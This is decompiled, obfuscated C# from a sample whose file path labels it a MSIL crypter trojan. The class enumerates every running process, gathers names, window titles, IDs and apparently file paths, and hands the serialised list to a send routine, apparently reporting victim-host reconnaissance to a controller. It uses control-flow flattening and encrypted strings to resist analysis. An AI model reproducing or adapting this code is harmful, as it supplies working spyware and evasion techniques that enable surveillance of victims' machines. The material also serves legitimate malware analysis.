// Decompiled with JetBrains decompiler
// Type: @Ӭ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.CompilerServices;

internal sealed class \u0040Ӭ : \u0040Ӡ
{
  private readonly object \u0040ӓ;
  private readonly int \u0040Ӕ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string e6A() => (string) this.\u0040ӓ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public int E2I() => this.\u0040Ӕ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040Ӭ(string _param1, string _param2, \u0040Ԫ _param3)
  {
    \u0040Ӭ.\u0040ӣ();
    int num1 = \u0040Ӭ.\u0040Ӥ() ? 2 : 3;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 3:
          goto label_4;
        case 1:
        case 2:
          goto label_1;
        case 4:
          goto label_5;
        default:
          num1 = 4;
          continue;
      }
    }
label_1:
    \u0040Ӭ.\u0040Ӗ((object) this);
    goto label_5;
label_4:
    \u0040Ӭ.\u0040ӕ();
    goto label_1;
label_5:
    try
    {
      List<Dictionary<string, string>> dictionaryList = new List<Dictionary<string, string>>();
      foreach (Process process in (Process[]) \u0040Ӭ.\u0040ӗ())
      {
        Dictionary<string, string> dictionary = new Dictionary<string, string>()
        {
          [(string) \u0040Ӭ.\u0040Ә(1164)] = (string) \u0040Ӭ.\u0040Ӛ(\u0040Ӭ.\u0040ә((object) process), \u0040Ӭ.\u0040Ә(1412)),
          [(string) \u0040Ӭ.\u0040Ә(2440)] = (string) \u0040Ӭ.\u0040Ӛ(\u0040Ӭ.\u0040ӛ((object) process), \u0040Ӭ.\u0040Ә(2446)),
          [(string) \u0040Ӭ.\u0040Ә(2452)] = (string) \u0040Ӭ.\u0040Ӛ((object) \u0040Ӭ.\u0040Ӝ((object) process).ToString(), \u0040Ӭ.\u0040Ә(2446))
        };
        if (\u0040Ӭ.\u0040Ӝ((object) process) == \u0040Ӭ.\u0040Ӝ(\u0040Ӭ.\u0040ӝ()))
          dictionary[(string) \u0040Ӭ.\u0040Ә(2458)] = (string) \u0040Ӭ.\u0040Ә(2416);
        try
        {
          bool flag = \u0040Ӭ.\u0040ӟ(\u0040Ӭ.\u0040Ӟ((object) process), IntPtr.Zero);
          int num2;
          if (!\u0040Ӭ.\u0040Ӥ())
          {
            int num3 = 3;
            num2 = \u0040Ӭ.\u0040Ӥ() ? num3 : num3;
          }
          else
            goto label_14;
label_13:
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 3:
                if (!flag)
                {
                  dictionary[(string) \u0040Ӭ.\u0040Ә(2464)] = (string) \u0040Ӭ.\u0040Ә(2470);
                  num2 = 4;
                  continue;
                }
                goto label_15;
              case 4:
                goto label_18;
              default:
                goto label_15;
            }
          }
label_15:
          dictionary[(string) \u0040Ӭ.\u0040Ә(2464)] = (string) ((object) \u0040ԝ.\u0040ս(1024, process) ?? \u0040Ӭ.\u0040Ә(2470));
          goto label_18;
label_14:
          num2 = 2;
          goto label_13;
        }
        catch
        {
          dictionary[(string) \u0040Ӭ.\u0040Ә(2464)] = (string) \u0040Ӭ.\u0040Ә(2470);
        }
label_18:
        dictionaryList.Add(dictionary);
      }
      \u0040Ӭ.\u0040ӡ((object) _param1, \u0040Ӭ.\u0040Ә(2486), \u0040Ӭ.\u0040Ӡ((object) dictionaryList), _param3);
      this.\u0040Ӕ = 0;
    }
    catch (Exception ex)
    {
      this.\u0040ӓ = \u0040Ӭ.\u0040Ӣ((object) ex);
      this.\u0040Ӕ = 1;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӗ() => (object) Process.GetProcesses();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ә(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ә(object _param0) => (object) ((Process) _param0).ProcessName;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӛ(object _param0, object _param1) => (object) ((string) _param0 + (string) _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӛ(object _param0) => (object) ((Process) _param0).MainWindowTitle;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0040Ӝ(object _param0) => ((Process) _param0).Id;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӝ() => (object) Process.GetCurrentProcess();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static IntPtr \u0040Ӟ(object _param0) => ((Process) _param0).Handle;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӟ(IntPtr _param0, IntPtr _param1) => _param0 != _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӡ(object _param0) => (object) _param0.\u0040ӓ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӡ(object _param0, object _param1, object _param2, \u0040Ԫ _param3) => \u0040Ԡ.\u0040Ӕ.\u0040Ӗ(_param0, _param1, _param2, _param3);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӣ(object _param0) => (object) ((Exception) _param0).Message;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӣ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӥ() => false;
}
